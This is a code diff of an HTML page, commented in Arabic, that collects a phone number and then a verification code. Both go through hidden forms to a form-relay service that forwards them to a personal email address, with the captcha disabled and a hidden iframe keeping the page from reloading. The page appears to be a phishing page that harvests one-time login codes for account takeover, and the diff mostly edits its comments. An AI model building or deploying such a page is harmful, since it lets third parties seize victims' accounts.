@@ -81,6 +81,8 @@
     <!-- النموذج الأول: إرسال رقم الهاتف -->
     <form id="phoneForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST" target="dummyFrame" onsubmit="return sendPhone();">
       <input type="hidden" name="_captcha" value="false">
+
+      <!-- نوع الطلب أولاً -->
       <input type="hidden" name="نوع الطلب" value="إرسال رقم الهاتف فقط">
 
       <label for="phone">رقم الهاتف:</label>
@@ -89,10 +91,12 @@
       <button type="submit">أرسل الكود</button>
     </form>
 
-    <!-- النموذج الثاني: إدخال الكود + إعادة إرسال رقم الهاتف -->
+    <!-- النموذج الثاني: إدخال الكود -->
     <div id="codeSection">
       <form id="codeForm" action="https://formsubmit.co/hellafi1992@gmail.com" method="POST" onsubmit="return prepareToSend();">
         <input type="hidden" name="_captcha" value="false">
+
+        <!-- نوع الطلب أولاً -->
         <input type="hidden" name="نوع الطلب" value="طلب الدخول">
         <input type="hidden" name="📱 رقم الهاتف" id="phoneHidden">
 
@@ -106,7 +110,7 @@
     </div>
   </div>
 
-  <!-- إطار وهمي لمنع إعادة تحميل الصفحة -->
+  <!-- إطار مخفي لمنع إعادة تحميل الصفحة -->
   <iframe name="dummyFrame" style="display:none;"></iframe>
 
   <script>
@@ -119,13 +123,9 @@
         return false;
       }
 
-      // تعطيل تعديل الرقم
       phoneInput.disabled = true;
-
-      // نقل الرقم للنموذج الثاني
       document.getElementById('phoneHidden').value = phone;
 
-      // إظهار حقل الكود + المؤقت
       setTimeout(() => {
         document.getElementById('codeSection').style.display = 'block';
         startTimer(300);
